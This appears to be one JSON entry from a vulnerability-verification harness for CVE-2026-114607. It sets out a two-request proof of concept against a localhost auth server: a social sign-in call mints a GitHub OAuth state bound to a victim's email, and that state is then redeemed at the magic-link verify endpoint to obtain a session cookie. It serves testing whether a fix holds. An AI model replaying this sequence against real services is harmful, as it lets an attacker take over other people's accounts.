  {
    "from": "manual-poc-2026-10-28/CVE-2026-114607 (spec)",
    "spec": {
      "strategy": "direct_observation",
      "transport": "http",
      "observable_effect": "GET /api/auth/magic-link/verify redeems a GitHub OAuth state issued by sign-in/social and answers with a Set-Cookie session header, which the fixed build does not return.",
      "inputs": [
        "victim_email"
      ],
      "auth": {},
      "checks": [
        {
          "label": "spec",
          "discover": [
            {
              "bind": "state",
              "query": [
                {
                  "method": "POST",
                  "path": "/api/auth/sign-in/social",
                  "headers": {
                    "Origin": "http://localhost:3000",
                    "Content-Type": "application/json"
                  },
                  "body": "{\"provider\": \"github\", \"disableRedirect\": true, \"additionalData\": {\"type\": \"magic-link\", \"email\": \"{{victim_email}}\"}}"
                }
              ],
              "extract": {
                "regex": "state=([A-Za-z0-9_\\-]+)"
              }
            }
          ],
          "probe": [
            {
              "method": "GET",
              "path": "/api/auth/magic-link/verify?token={{state}}",
              "headers": {
                "Origin": "http://localhost:3000"
              },
              "body": null
            }
          ],
          "expect": {
            "header": "set-cookie"
          }
        }
      ],
      "health_timeout": 120
    }
  },
